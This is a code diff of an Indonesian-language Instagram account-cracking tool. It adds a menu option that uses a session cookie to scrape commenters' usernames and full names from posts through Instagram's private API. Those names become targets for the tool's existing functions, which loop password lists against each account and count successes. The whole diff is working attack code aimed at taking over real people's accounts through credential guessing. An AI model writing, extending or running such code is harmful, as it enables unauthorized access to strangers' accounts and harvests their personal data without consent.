@@ -299,11 +299,11 @@ def menu():
         time.sleep(3)
         return
     os.system('clear')
-    tabel1 = f"[bold white]01\n02\n00"
+    tabel1 = f"[bold white]01\n02\n03\n00"
     tabel2 = (
-        f"[bold white]Crack Dari Pengikut\nCrack Dari Mengikuti\nGanti Cookie"
+        f"[bold white]Crack Dari Pengikut\nCrack Dari Mengikuti\nDump Komentar\nGanti Cookie"
     )
-    tabel3 = f"[bold white]ON\nON\nON"
+    tabel3 = f"[bold white]ON\nON\nON\nON"
     colume_tabel = me()
     colume_tabel.add_column("NO", style="bold green", justify='center')
     colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
@@ -315,10 +315,39 @@ def menu():
         dumps(aset, True)
     elif x in ['02','2']:
         dumps(aset, False)
+    elif x in ['03','3']:
+        komentar(aset)
     elif x in ['00','0']:
         os.system('rm -rf .Cokies-IG.txt')
         print("berhasil menghapus cookies")
         exit()
+        
+def komentar(cokie, dav=[]):
+	prints(Panel.fit('[bold white]Masukan link postingan atau reels. bisa di pisahkan dengan koma',style='bold blue'))
+	link = input(f'└──╭➣ Masukan Link :').split(',')
+	try:
+		for ling in link:
+			r = requests.get(ling, cookies=cokie).text
+			o = re.search('"media_id":"(\d+)"', str(r)).group(1)
+			dav.append(o)
+		for x in dav:
+			dump_komen(cokie, x, '')
+	except:pass
+	Metode()
+
+def dump_komen(cokie, uid, min):
+	global xx
+	try:
+		r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
+		for i in r['comments']:
+			a = i['user']['username'] +'|'+ i['user']['full_name']
+			if a not in Uuid:
+				Uuid.append(a)
+				xx +=1
+				print(f'└──╭➣ Berhasil dump [ {xx} ] id [ {uid} ]',end='\r')
+		if 'next_min_id' in str(r):
+			dump_komen(cokie, uid, r['next_min_id'])
+	except:pass
 
 def dumps(kuki, typess, xyz=[]):
 	if 'csrftoken' not in str(kuki):
@@ -367,7 +396,6 @@ def Graphql(typess, userid, cokie,after):
                 exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
         khm = 'edge_followed_by' if typess is True else 'edge_follow'
         for xyz in req['data']['user'][khm]['edges']:
-            username = xyz['node']['username']
             xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
             if xy not in Uuid:
                 xx += 1
@@ -454,7 +482,7 @@ def Password(name):
 
 def Crack_api(username, memek):
 	global Ok, Cp, Loop
-	sys.stdout.write(f"\r└──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
+	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ]  Success [ {Ok} ] Failed [ {Cp} ]"),
 	sys.stdout.flush()
 	for password in memek:
 		try:
@@ -518,7 +546,7 @@ def Crack_api(username, memek):
 def Crack_i(username, memek):
 	global Ok, Cp, Loop
 	bo = random.choice([u])
-	sys.stdout.write(f"\r└──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
+	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
 	sys.stdout.flush()
 	for password in memek:
 		try:
@@ -579,7 +607,7 @@ def x_mid(mid_list):
 
 def crack_ajax(username, memek):
 	global Ok, Cp, Loop
-	sys.stdout.write(f"\r└──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
+	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
 	sys.stdout.flush()    
 	for password in memek:
 		try:
@@ -669,7 +697,7 @@ def crack_ajax(username, memek):
 
 def crack(username, memek):
 	global Ok, Cp, Loop
-	sys.stdout.write(f"\r└──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
+	sys.stdout.write(f"\rRuning [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] [ {str(username)[:6]} ] Success [ {Ok} ] Failed [ {Cp} ]"),
 	sys.stdout.flush()    
 	for password in memek:
 		try:
